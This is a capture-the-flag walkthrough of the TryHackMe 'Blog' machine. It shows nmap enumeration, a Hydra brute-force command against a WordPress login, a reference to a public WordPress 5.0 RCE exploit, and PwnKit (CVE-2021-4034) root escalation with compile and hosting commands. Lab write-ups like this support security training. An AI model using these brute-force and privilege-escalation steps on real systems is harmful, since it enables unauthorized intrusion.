> In this walkthrough, we compromise the TryHackMe **Blog** machine by abusing an exposed SMB share, enumerating a vulnerable **WordPress 5.0** instance, brute forcing credentials with **Hydra**, gaining remote code execution through a public exploit, and escalating privileges via **PwnKit (CVE-2021-4034)** to capture both user and root flags.

## Initial Setup

First things first, let’s teach our machine where the target lives:

```plaintext
10.113.142.64 blog.thm
```
{: file="/etc/hosts" }

Simple. Clean. No DNS drama.

## Enumeration

As always, we start wide.

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN nmap_full_scan.txt blog.thm
```
{: .nolineno }

The scan gave us **four interesting open ports**:

- **22 → SSH**
- **80 → Apache / WordPress**
- **139 → SMB**
- **445 → SMB**

The web server immediately revealed this was a **WordPress 5.0 blog**, while SMB looked suspiciously open enough to deserve attention.

Since SMB has a habit of leaking “accidental gifts,” I decided to start there first.

## Password Attack

With valid usernames in hand, brute forcing the login page became the obvious next step.

First, I saved them into:

- `wpusers.txt`

Then I captured the login request in Burp Suite to build the correct Hydra syntax.

![](burp_cupture_wp_login_req.webp){: width="800" height="400" .shadow }

```shell
hydra -t 64 -L wpusers.txt -P /usr/share/wordlists/rockyou.txt blog.thm \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=The password you entered for the username"
```
{: .nolineno }

### Valid Credentials Found

```text
kwheel : [REDACTED]
```

And just like that, Billy’s blog became **our blog**.

## Initial Foothold → WordPress RCE

With valid credentials, logging into WordPress was easy.

However, there was one problem:

The user **`kwheel` only had Author privileges**.

That means:
- ❌ no plugin upload
- ❌ no theme editor access
- ❌ no direct PHP shell injection

So the classic WordPress author-to-admin route was blocked.

Time for an exploit.

Searching online for:

- `wordpress 5.0 exploit`

quickly led to a public **Exploit-DB PoC**, which also had a **Metasploit module** available.

## Privilege Escalation → PwnKit

A quick SUID sweep gave us something beautiful:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Among the results:

```text
/usr/bin/pkexec
```

Version check:

```shell
/usr/bin/pkexec --version
```
{: .nolineno }

Output:

```text
pkexec version 0.105
```

This version is vulnerable to **PwnKit (CVE-2021-4034)**.

We can grab a public PoC from:

- `https://github.com/ly4k/PwnKit`

You can either:
- use the precompiled binary from the repo
- or compile it locally and upload it

I chose to build it locally:

```shell
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```
{: .nolineno }

Then I hosted it using a Python HTTP server:

```shell
python3 -m http.server 8000
```
{: .nolineno }

Any free port works.

On the target machine, I downloaded it with `wget`, changed permissions, and executed it.

![](priv_esc_pwnkit.webp){: width="800" height="400" .shadow }

Boom. Root shell.
